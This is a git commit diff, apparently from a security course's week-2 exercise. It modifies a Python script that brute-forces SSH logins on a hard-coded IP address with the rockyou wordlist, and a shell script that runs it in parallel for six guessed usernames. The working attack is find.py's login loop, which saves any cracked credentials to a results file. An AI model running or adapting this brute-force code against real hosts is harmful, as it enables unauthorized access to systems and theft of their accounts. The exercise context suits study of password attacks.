5f37f57f859852f62be645ae0cdeb8f71f779765
root <root@localhost.localdomain>
2018-09-14 23:21:54 -0400

    code

--- week/2/find.py
+++ week/2/find.py
@@ -1,19 +1,21 @@
 import gzip
 from pexpect import pxssh
+from sys import argv
 
 shell = pxssh.pxssh()
 
 host =  '142.93.118.186'
-user_list = ['kruegster1990', 'fkruegster', 'kruegster', 'fredkruegster', 'fkrueger', 'krueger']
-
-for user in user_list:
-    print 'user: ' + user
-    for word in gzip.open('/usr/share/wordlists/rockyou.txt.gz', 'rb'):
-        word = word.strip()
-        try:
-            shell.login(host, user, word)
-            print "Got it!"
-            print (host, user, word)
-            exit()
-        except Exception:
-            pass
+print 'user: ' + argv[1]
+user = argv[1]
+for word in gzip.open('/usr/share/wordlists/rockyou.txt.gz', 'rb'):
+    word = word.strip()
+    print word
+    try:
+        shell.login(host, user, word)
+        print "Got it!"
+        print (host, user, word)
+        with open('results'+argv[1]+'.txt','w') as f:
+            f.write(str((host, user, word)))
+        exit()
+    except Exception:
+        pass
--- week/2/start_find.sh
+++ week/2/start_find.sh
@@ -1,4 +1,4 @@
-for i in {1..5}
+for i in "kruegster1990" "fkruegster" "kruegster" "fredkruegster" "fkrueger" "krueger"
 do
-    python find.py &
+    python find.py $i &
 done
